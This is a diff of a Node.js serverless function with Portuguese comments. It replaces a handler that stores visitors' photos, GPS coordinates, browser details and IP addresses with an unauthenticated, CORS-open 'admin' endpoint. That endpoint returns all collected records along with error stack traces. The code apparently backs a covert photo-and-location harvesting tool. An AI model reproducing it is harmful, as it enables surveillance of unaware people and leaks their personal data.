@@ -1,121 +1,63 @@
-const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
 const path = require('path');
 
+// ===== MESMA PASTA QUE O COLETAR USA =====
 const UPLOAD_DIR = '/tmp/uploads';
 
-// Garante que a pasta existe
-if (!fs.existsSync(UPLOAD_DIR)) {
-    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
-}
-
-exports.handler = async (event, context) => {
-    // ===== LOG DETALHADO DA REQUISIÇÃO =====
-    console.log('📥 REQUISIÇÃO RECEBIDA');
-    console.log('📋 Método:', event.httpMethod);
-    console.log('📋 Headers:', JSON.stringify(event.headers, null, 2));
-    
-    // Apenas aceita POST
-    if (event.httpMethod !== 'POST') {
-        console.log('❌ Método não permitido:', event.httpMethod);
-        return {
-            statusCode: 405,
-            body: JSON.stringify({ erro: 'Método não permitido' })
-        };
-    }
+exports.handler = async (event) => {
+    console.log('📊 Admin: Iniciando busca de dados...');
+    console.log('📁 Pasta:', UPLOAD_DIR);
 
     try {
-        // ===== LOG DO CORPO DA REQUISIÇÃO =====
-        console.log('📦 CORPO DA REQUISIÇÃO (RAW):', event.body);
-        
-        const dados = JSON.parse(event.body);
-        console.log('📦 DADOS PARSEADOS:', JSON.stringify(dados, null, 2));
-        
-        const id = uuidv4();
-        const timestamp = Date.now();
-        const dataHora = new Date().toISOString();
-
-        console.log(`🆔 ID Gerado: ${id}`);
-        console.log(`📅 Timestamp: ${dataHora}`);
-
-        let fotoSalva = false;
-        let nomeFoto = null;
-
-        // ===== SALVA A FOTO =====
-        if (dados.foto && dados.foto.startsWith('data:image')) {
-            console.log('📸 Processando foto...');
-            try {
-                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
-                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
-                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
-                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
-                fs.writeFileSync(fotoPath, base64Data, 'base64');
-                fotoSalva = true;
-                console.log(`✅ Foto salva: ${nomeFoto} (${Math.round(base64Data.length / 1024)}KB)`);
-            } catch (err) {
-                console.log(`❌ Erro ao salvar foto: ${err.message}`);
-            }
-        } else {
-            console.log('⚠️ Nenhuma foto enviada ou formato inválido');
+        // Verifica se a pasta existe
+        if (!fs.existsSync(UPLOAD_DIR)) {
+            console.log('⚠️ Pasta /tmp/uploads não existe ainda');
+            return {
+                statusCode: 200,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                },
+                body: JSON.stringify({ 
+                    total: 0, 
+                    arquivos: [],
+                    mensagem: 'Nenhuma coleta ainda' 
+                })
+            };
         }
 
-        // ===== LOG DA LOCALIZAÇÃO =====
-        if (dados.localizacao) {
-            console.log('📍 LOCALIZAÇÃO:');
-            console.log(`   Latitude: ${dados.localizacao.latitude}`);
-            console.log(`   Longitude: ${dados.localizacao.longitude}`);
-            console.log(`   Precisão: ${dados.localizacao.precisao}m`);
-        } else {
-            console.log('⚠️ Nenhuma localização enviada');
-        }
+        // Lista o conteúdo da pasta
+        const todosArquivos = fs.readdirSync(UPLOAD_DIR);
+        console.log('📂 Arquivos em /tmp/uploads:', todosArquivos);
 
-        // ===== LOG DO NAVEGADOR =====
-        if (dados.navegador) {
-            console.log('🖥️ NAVEGADOR:');
-            console.log(`   User-Agent: ${dados.navegador.userAgent}`);
-            console.log(`   Timezone: ${dados.navegador.timezone}`);
-            console.log(`   Idioma: ${dados.navegador.language}`);
-        }
+        // Filtra apenas os JSONs de dados
+        const arquivosJson = todosArquivos
+            .filter(f => f.endsWith('.json') && f.startsWith('dados_'))
+            .map(f => {
+                const caminho = path.join(UPLOAD_DIR, f);
+                const stats = fs.statSync(caminho);
+                try {
+                    const conteudo = JSON.parse(fs.readFileSync(caminho, 'utf8'));
+                    return {
+                        arquivo: f,
+                        tamanho: stats.size,
+                        data: stats.mtime,
+                        conteudo: conteudo
+                    };
+                } catch (e) {
+                    console.error('❌ Erro ao ler arquivo:', f, e.message);
+                    return {
+                        arquivo: f,
+                        tamanho: stats.size,
+                        data: stats.mtime,
+                        conteudo: { erro: 'Erro ao ler arquivo' }
+                    };
+                }
+            })
+            .sort((a, b) => new Date(b.data) - new Date(a.data));
 
-        // ===== SALVA OS DADOS EM JSON =====
-        const dadosParaSalvar = {
-            id,
-            timestamp: dataHora,
-            localizacao: dados.localizacao || null,
-            navegador: dados.navegador || null,
-            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
-            foto: fotoSalva ? nomeFoto : null
-        };
+        console.log(`✅ Encontrados ${arquivosJson.length} arquivos de dados`);
 
-        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
-        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
-        console.log(`💾 Dados salvos em: ${jsonPath}`);
-
-        // ===== SALVA NO CSV =====
-        const csvPath = path.join(UPLOAD_DIR, 'todos_dados.csv');
-        const csvExiste = fs.existsSync(csvPath);
-        const csvLine = [
-            dataHora,
-            id,
-            dados.localizacao?.latitude || 'N/A',
-            dados.localizacao?.longitude || 'N/A',
-            dados.localizacao?.precisao || 'N/A',
-            dados.navegador?.userAgent || 'N/A',
-            dados.navegador?.timezone || 'N/A',
-            dados.navegador?.language || 'N/A',
-            event.headers['x-forwarded-for'] || 'N/A',
-            fotoSalva ? 'Sim' : 'Não'
-        ].join(',');
-
-        if (!csvExiste) {
-            fs.writeFileSync(csvPath, 'Data,ID,Latitude,Longitude,Precisao,UserAgent,Timezone,Idioma,IP,Foto\n' + csvLine + '\n');
-        } else {
-            fs.appendFileSync(csvPath, csvLine + '\n');
-        }
-        console.log('📊 CSV atualizado com sucesso');
-
-        // ===== RESPOSTA =====
-        console.log('✅ COLETA FINALIZADA COM SUCESSO!');
         return {
             statusCode: 200,
             headers: {
@@ -123,16 +65,13 @@ exports.handler = async (event, context) => {
                 'Access-Control-Allow-Origin': '*'
             },
             body: JSON.stringify({
-                status: 'success',
-                id: id,
-                fotoSalva: fotoSalva,
-                timestamp: dataHora
+                total: arquivosJson.length,
+                arquivos: arquivosJson
             })
         };
 
     } catch (error) {
-        console.error('💥 ERRO CRÍTICO:', error);
-        console.error('📚 Stack:', error.stack);
+        console.error('💥 Erro no admin:', error);
         return {
             statusCode: 500,
             headers: {
@@ -140,8 +79,8 @@ exports.handler = async (event, context) => {
                 'Access-Control-Allow-Origin': '*'
             },
             body: JSON.stringify({
-                status: 'error',
-                mensagem: error.message
+                erro: error.message,
+                stack: error.stack
             })
         };
     }
